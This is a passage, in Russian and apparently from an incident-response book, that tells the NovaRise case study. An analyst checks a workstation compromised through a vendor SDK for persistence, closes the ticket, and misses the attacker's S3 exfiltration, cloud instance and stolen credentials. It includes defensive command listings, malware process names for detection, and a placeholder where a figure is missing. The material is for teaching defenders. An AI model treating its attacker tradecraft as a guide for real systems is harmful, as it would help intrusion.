Не обнаружив активных вредоносных процессов и текущих сетевых индикаторов, Сэм оценил состояние сдерживания. Джордан уже завершила процессы и удалила SDK. Рабочая станция работала нормально и не демонстрировала признаков продолжающейся компрометации.

Сэм зафиксировал оценку: угроза на рабочей станции больше не активна, и дополнительных действий по сдерживанию сейчас не требуется. Он рекомендовал Джордан не устанавливать SDK Gilded Freight повторно, пока с поставщиком не свяжутся по поводу подозрительных компонентов.

## Искоренение

Для искоренения Сэм рекомендовал полное сканирование рабочей станции Джордан корпоративной endpoint protection platform. Сканирование ничего не обнаружило, что соответствовало тому факту, что Джордан уже удалила каталог SDK и связанные с ним файлы.

Сэм проверил типовые места закрепления, чтобы убедиться, что ничего не осталось.

### Листинг 23. Проверка закрепления

```
sam@jm-workstation ~
$ crontab -l -u jm
no crontab for jm ①
$ ls -la /etc/systemd/system/ | grep -i "gilded\|ssupd\|ms"
$ ls -la /home/jm/.config/autostart/ 2>/dev/null
ls: cannot access '/home/jm/.config/autostart/': No such file or directory ②
```

① Для учётной записи Джордан нет scheduled tasks.  
② Нет autostart-записей.

Ни cron job, ни systemd service, ни Linux desktop autostart entry. Насколько мог определить Сэм, искоренение было завершено.

## Восстановление

Рабочая станция уже работала. После удаления SDK Джордан пользовалась ею четыре дня без проблем. Дополнительных действий по восстановлению не требовалось.

## Извлечённые уроки

Сэм закрыл ticket профессиональным резюме. Он задокументировал хронологию, задействованные процессы, использованные порты и выполненные действия. Его рекомендации были разумными:

- связаться с поставщиком Gilded Freight по поводу подозрительных компонентов SDK;
- пересмотреть процесс закупки SDK и включить проверку безопасности до установки;
- рассмотреть добавление имён процессов `ms`, `ssupd` и `gilded-sdk-update` в endpoint detection watch list.

Сэм отметил ticket как решённый. Документация была подробной, анализ — обоснованным, каждый шаг процесса реагирования был выполнен. По любому стандартному checklist инцидент считался обработанным.

## Что осталось незамеченным

Пока Сэм закрывал ticket, Pyrix скачивал последний квартальный экспорт клиентских данных из S3 bucket `novarise-customer-data`. EC2 instance, запущенный с credentials Джордан, всё ещё работал в AWS-аккаунте NovaRise и тихо подготавливал файлы к эксфильтрации. SSH-ключи Джордан всё ещё были действительны на трёх внутренних серверах разработки. Credentials production-базы, собранные с `nfdev-01`, также оставались активными.

Сэм не искал имена процессов, сетевые индикаторы или активность на порту 9150 — и вообще на любых других системах среды. Он не проверил, устанавливали ли тот же SDK Gilded Freight другие разработчики. Он не изучил AWS CloudTrail на предмет несанкционированного использования credentials Джордан. Он не расследовал, применялись ли SSH-ключи с её рабочей станции из неожиданного источника.

### Рисунок 6. Пробелы в расследовании компрометации NovaRise

`THIRD_PARTY_REVIEW_REQUIRED` — визуальный объект отсутствует как самостоятельный multimodal RAG-объект; в переводе сохранена только подпись и смысловая ссылка на него.

Ответ Сэма не был ни небрежным, ни следствием халатности. Он следовал структурированному процессу, на каждом шаге применял разумное суждение и документировал работу. Проблема заключалась в том, что его PICERL-based playbook рассматривал рабочую станцию как весь инцидент. Как только процессы исчезли, а сканирование вернулось чистым, процесс, которому он следовал, сообщил ему, что работа закончена.

Ничто в процессе Сэма не заставляло его спросить, чего именно добился атакующий за время несанкционированного доступа. Ничто не подталкивало проверить, использовались ли credentials Джордан где-то ещё или установлен ли тот же SDK на других машинах разработчиков. Реагирование оставалось ограниченным рабочей станцией, потому что модель реагирования не требовала смотреть за её пределы.

Процесс, который проходит от идентификации к восстановлению за один прямой проход, предполагает, что видимые индикаторы отражают полный масштаб компрометации. Для многих атак — от простых до сложных — такое предположение приводит к недостаточному реагированию. К моменту, когда Сэм закрыл ticket, точка опоры атакующего уже вышла далеко за пределы рабочей станции, где расследование началось и закончилось, а организация об этом даже не подозревала.
